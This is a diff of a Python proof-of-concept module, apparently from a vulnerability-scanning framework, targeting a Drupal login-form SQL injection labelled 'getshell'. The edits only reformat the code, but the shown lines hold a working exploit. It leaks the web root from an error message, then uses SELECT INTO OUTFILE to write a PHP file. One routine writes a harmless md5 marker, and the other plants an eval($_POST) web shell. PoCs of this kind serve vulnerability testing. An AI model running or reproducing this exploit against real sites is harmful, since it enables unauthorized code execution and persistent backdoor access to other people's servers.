@@ -6,6 +6,7 @@ import re
 import random
 import urllib
 
+
 class Vuln(ABVuln):
     vuln_id = 'Drupal_0003'  # 平台漏洞编号，留空
     name = 'Drupal /index.php getshell'  # 漏洞名称
@@ -37,16 +38,17 @@ class Poc(ABPoc):
 
             hh = hackhttp.hackhttp()
             payload = '?q=node&destination=node'
-            filename = '/shell' + str(random.randint(1,10000000000)) + '.php'
+            filename = '/shell' + str(random.randint(1, 10000000000)) + '.php'
             target = self.target + payload
             post1 = "name[0%20;select%20'<?php%20print(md5(1))?>'%20into%20outfile%20'test5.php';#%20%20]=test3&name[0]=test&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in"
             code, head, body, errcode, final_url = hh.http(target, post=post1)
             res = re.findall('line.+of.+>([^<>]+)includes/unicode.inc', body)
             if (len(res) == 0):
-                return 
+                return
             path = res[0]
-            post2 = "name[0%20;select%20'<?php%20print(md5(1))?>'%20into%20outfile%20'" + path + filename + "';#%20%20]=test3&name[0]=test&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in"
-            code, head, body, errcode, final_url = hh.http(target, post=post2);
+            post2 = "name[0%20;select%20'<?php%20print(md5(1))?>'%20into%20outfile%20'" + path + filename + \
+                "';#%20%20]=test3&name[0]=test&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in"
+            code, head, body, errcode, final_url = hh.http(target, post=post2)
             target2 = self.target + filename
             code, head, body, errcode, final_url = hh.http(target2)
 
@@ -65,17 +67,18 @@ class Poc(ABPoc):
 
             hh = hackhttp.hackhttp()
             payload = '?q=node&destination=node'
-            filename = '/shell' + str(random.randint(1,10000000000)) + '.php'
+            filename = '/shell' + str(random.randint(1, 10000000000)) + '.php'
             target = self.target + payload
             post1 = "name[0%20;select%20'<?php%20print(md5(1))?>'%20into%20outfile%20'test5.php';#%20%20]=test3&name[0]=test&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in"
             code, head, body, errcode, final_url = hh.http(target, post=post1)
             res = re.findall('line.+of.+>([^<>]+)includes/unicode.inc', body)
             if (len(res) == 0):
-                return 
+                return
             path = res[0]
-            #getshell
-            post2 = "name[0%20;select%20'<?php @eval($_POST[c);?>'%20into%20outfile%20'" + path + filename + "';#%20%20]=test3&name[0]=test&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in"
-            code, head, body, errcode, final_url = hh.http(target, post=post2);
+            # getshell
+            post2 = "name[0%20;select%20'<?php @eval($_POST[c);?>'%20into%20outfile%20'" + path + filename + \
+                "';#%20%20]=test3&name[0]=test&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in"
+            code, head, body, errcode, final_url = hh.http(target, post=post2)
             target2 = self.target + filename
             code, head, body, errcode, final_url = hh.http(target2)
 
@@ -86,6 +89,7 @@ class Poc(ABPoc):
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
+
 
 if __name__ == '__main__':
     Poc().run()
